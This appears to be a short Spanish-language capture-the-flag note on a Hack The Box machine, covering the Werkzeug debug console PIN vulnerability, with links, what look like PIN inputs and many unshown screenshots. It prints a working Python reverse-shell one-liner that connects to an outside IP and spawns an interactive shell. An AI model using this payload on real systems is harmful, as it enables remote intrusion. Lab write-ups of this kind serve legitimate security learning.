
Esta misma vulnerabilidad esta en Agile de HTB.

![[Pasted image 20240724075442.png]]

https://www.daehee.com/blog/werkzeug-console-pin-exploit

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

![[Pasted image 20240724081617.png]]

![[Pasted image 20240724081739.png]]

00:50:56:b0:79:c4
258f132cd7e647caaf5510e3aca997c1

User: aas
![[Pasted image 20240724083249.png]]
![[Pasted image 20240724083505.png]]

![[Pasted image 20240724084051.png]]

![[Pasted image 20240724084141.png]]

![[Pasted image 20240724084156.png]]

![[Pasted image 20240724084326.png]]


```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

![[Pasted image 20240724091421.png]]



